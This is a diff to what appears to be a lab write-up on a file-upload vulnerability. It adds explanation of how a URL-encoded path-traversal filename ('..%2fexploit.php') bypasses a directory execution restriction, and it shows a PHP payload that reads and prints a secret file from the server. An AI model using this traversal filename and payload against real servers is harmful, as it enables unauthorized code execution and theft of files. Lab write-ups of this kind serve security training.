@@ -22,11 +22,12 @@ Application prevents from file execution in user-accessible directories.
 
 |![](Images/image-12.png)|
 |:--:| 
-| *Normal upload request* |
+| *Successful PHP payload upload* |
 |![](Images/image-13.png)|
 | *PHP payload was not executed* |
 
 ## Exploitation
+Exploit file was uploaded to `../` directory. In this way attacker can bypass above mentioned restriction and execute payload on the server.
 
 Filename:
 ```
@@ -35,13 +36,13 @@ URL Encoded: filename="..%2fexploit.php"
 ```
 
 Payload `exploit.php`:
-```
+```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
 |![](Images/image-14.png)|
 |:--:| 
-| *PHP payload code upload* |
+| *Successful PHP payload upload* |
 |![](Images/image-15.png)|
 | *Path to uploaded file* |
 |![](Images/image-16.png)|
